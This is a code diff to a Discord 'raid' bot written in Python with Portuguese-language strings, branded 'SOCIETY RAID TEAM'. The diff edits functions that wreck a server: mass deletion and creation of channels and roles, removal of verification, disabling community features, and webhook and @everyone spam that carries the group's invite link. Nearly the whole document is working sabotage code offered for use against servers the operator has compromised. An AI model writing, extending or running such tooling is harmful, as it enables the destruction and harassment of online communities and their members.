@@ -5,7 +5,6 @@ import aiohttp
 import os
 from dotenv import load_dotenv
 
-# Carrega variáveis de ambiente do arquivo .env
 load_dotenv()
 TOKEN = os.getenv('TOKEN')
 
@@ -31,7 +30,7 @@ user_sessions = {}
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="/cybersec"))
+    await bot.change_presence(activity=discord.Streaming(name=".    Scty", url="https://www.twitch.tv/society"))
     print(f'Bot {bot.user} ONLINE!')
     print(f'RAID MODE ACTIVATED')
 
@@ -161,7 +160,6 @@ async def on_message(message):
         banner = "SOCIETY RAID TEAM - SERVIDOR DESTRUIDO"
         art = "SOCIETY PASSOU AQUI - PERDEU SERVE"
         
-        # PAGINA 1 (1-30)
         if opcao == "1":
             await message.channel.send("```Executando NUKE...```")
             asyncio.create_task(nuke(guild, banner, art, gifs))
@@ -282,8 +280,6 @@ async def on_message(message):
             await message.channel.send("```Max channels...```")
             asyncio.create_task(max_channels(guild, banner, art, gifs))
             del user_sessions[message.author.id]
-            
-        # PAGINA 2 (31-60)
         elif opcao == "31":
             await message.channel.send("```Max roles...```")
             asyncio.create_task(max_roles(guild))
@@ -404,8 +400,6 @@ async def on_message(message):
             await message.channel.send("```Disable community...```")
             asyncio.create_task(disable_community(guild))
             del user_sessions[message.author.id]
-            
-        # PAGINA 3 (61-90)
         elif opcao == "61":
             await message.channel.send("```Remove verification...```")
             asyncio.create_task(remove_verification(guild))
@@ -531,7 +525,6 @@ async def on_message(message):
             asyncio.create_task(auto_raid(guild, banner, art, gifs))
             del user_sessions[message.author.id]
 
-# FUNCOES PRINCIPAIS
 async def total_destruction(guild, banner, art, gifs):
     tasks = [
         deletar_canais(guild),
@@ -620,14 +613,12 @@ async def criar_canais_massa(guild, banner, art, gifs):
             nome_canal = nomes_canais[i % len(nomes_canais)]
             novo_canal = await guild.create_text_channel(nome_canal)
             asyncio.create_task(spam_messages(novo_canal, banner, art, gifs))
-            asyncio.create_task(spam_everyone(novo_canal))
         except:
             pass
 
 async def spam_canais_existentes(guild, banner, art, gifs):
     for canal in guild.text_channels:
         asyncio.create_task(spam_messages(canal, banner, art, gifs))
-        asyncio.create_task(spam_everyone(canal))
 
 async def webhook_spam(guild, banner, art, gifs):
     for canal in guild.text_channels:
@@ -639,8 +630,8 @@ async def webhook_spam(guild, banner, art, gifs):
 
 async def spam_webhook(webhook, banner, art, gifs):
     try:
-        for _ in range(100):
-            await webhook.send(f"@everyone\n{banner}")
+        for i in range(100):
+            await webhook.send(f"@everyone **{banner}**\n{art}\n{gifs[i % len(gifs)]}")
     except:
         pass
 
@@ -870,7 +861,6 @@ async def clone_server(guild):
     except:
         pass
 
-# FUNCOES PAGINA 2 (38-60)
 async def mass_unban(guild):
     try:
         for ban in await guild.bans():
@@ -1059,7 +1049,6 @@ async def disable_community(guild):
     except:
         pass
 
-# FUNCOES PAGINA 3 (61-89)
 async def remove_verification(guild):
     try:
         await guild.edit(verification_level=discord.VerificationLevel.none)
@@ -1260,28 +1249,21 @@ async def system_msg_spam(guild):
         except:
             pass
 
-async def spam_everyone(canal):
-    try:
-        while True:
-            tasks = []
-            for _ in range(10):
-                tasks.append(canal.send("@everyone"))
-            await asyncio.gather(*tasks, return_exceptions=True)
-            await asyncio.sleep(1)
-    except:
-        pass
-
 async def spam_messages(canal, banner, art, gifs):
     try:
         await asyncio.sleep(1)
-        for i in range(20):
+        for i in range(25):
             try:
-                await canal.send(f"@everyone {banner}")
-                await canal.send(f"{art}")
-                # Envia um gif por vez da lista
-                await canal.send(gifs[i % len(gifs)])
-                await canal.send(f"@everyone https://discord.gg/AAnFNAawqA")
-                await asyncio.sleep(0.5) # Pequeno delay para evitar rate limit agressivo
+                embed = discord.Embed(
+                    title=f"⚠️ {banner} ⚠️",
+                    description=f"**{art}**\n\n**SOCIETY RAID TEAM PASSOU AQUI!**\n\nEntre: https://discord.gg/WJ76QgRA",
+                    color=0xFF0000
+                )
+                embed.set_image(url=gifs[i % len(gifs)])
+                embed.set_footer(text="SOCIETY RAID BOT V0.0.0")
+                
+                await canal.send(content="@everyone", embed=embed)
+                await asyncio.sleep(0.4)
             except:
                 continue
     except:
